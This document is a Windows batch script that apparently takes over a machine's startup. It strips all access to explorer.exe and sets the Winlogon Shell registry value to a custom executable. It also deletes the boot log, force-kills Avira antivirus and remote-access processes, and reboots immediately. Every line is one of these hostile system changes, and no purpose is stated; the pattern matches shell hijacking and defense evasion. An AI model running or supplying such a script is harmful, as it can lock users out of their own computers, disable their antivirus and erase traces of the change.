@echo off
Echo Please wait...
cacls C:\WINDOWS\explorer.exe /e /p everyone:n
REG ADD HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /t REG_SZ /d C:\mas\startup\bin\debug\startup.exe /f
del C:\mas\started
if exist %windir%\ntbtlog.txt del %windir%\ntbtlog.txt
Echo Preparing to Restart...
taskkill /F /IM Startup.exe
taskkill /F /IM TetherWindows.exe
taskkill /F /IM remoting_host.exe
taskkill /F /IM Avira.OE.Systray.exe
taskkill /F /IM Avira.OE.ServiceHost.exe
taskkill /F /IM remoting_host.exe
taskkill /F /IM SearchSettings.exe
taskkill /F /IM explorer.exe
Echo Exiting
shutdown.exe -r -t 00
pause>nul
exit